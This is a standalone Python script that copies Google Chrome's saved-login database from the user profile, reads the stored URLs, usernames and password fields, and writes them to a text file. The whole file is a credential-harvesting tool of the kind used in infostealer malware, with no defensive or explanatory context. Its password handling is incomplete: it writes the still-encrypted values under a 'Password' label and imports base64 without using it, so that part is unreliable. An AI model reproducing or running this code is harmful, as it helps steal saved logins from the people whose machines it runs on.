import os
import shutil
import sqlite3
import base64

def extract_chrome_passwords():
    # Copy the Login Data file to a temporary location
    temp_file = os.path.join(os.environ['TEMP'], 'Login Data')
    login_data_file = os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Default\\Login Data')
    shutil.copy2(login_data_file, temp_file)

    # Connect to the copied database file and extract the passwords
    conn = sqlite3.connect(temp_file)
    cursor = conn.cursor()
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    results = cursor.fetchall()

    # Save the extracted passwords to a text file
    with open('chrome_passwords.txt', 'w', encoding='utf-8') as outfile:
        for result in results:
            url = result[0]
            username = result[1]
            password_encrypted = result[2]
            outfile.write(f'URL: {url}\nUsername: {username}\nPassword: {password_encrypted}\n\n')

    # Clean up the temporary file
    conn.close()
    os.remove(temp_file)

if __name__ == '__main__':
    extract_chrome_passwords()